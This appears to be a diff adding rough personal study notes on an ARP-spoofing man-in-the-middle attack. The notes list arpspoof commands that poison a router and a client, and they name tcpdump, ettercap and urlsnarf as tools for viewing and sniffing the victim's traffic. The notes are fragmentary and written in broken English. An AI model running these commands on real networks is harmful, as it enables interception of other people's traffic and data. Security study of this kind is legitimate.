@@ -1,0 +1,32 @@
+---MIMT--
+
+
+
+
+
+arpspoof -i eth0 -t (router addr) (clint addr) -------> we tell router
+arpspoof -i eth0 -t (clint addr) (router addr) -------> we tell clint
+
+
+for http website
+http (filter open website)
+
+
+$ tcpd ump (alternative of wireshark in commandline)
+
+for viewing other persone date 
+we use ethhecap
+
+chose 
+
+
+
+-----------------------------
+
+sudo arpspoof -i eth0  
+mimt
+
+check intercepetion network
+add user 1 router
+user 2 targert
+urlsnarf -i wlan0 
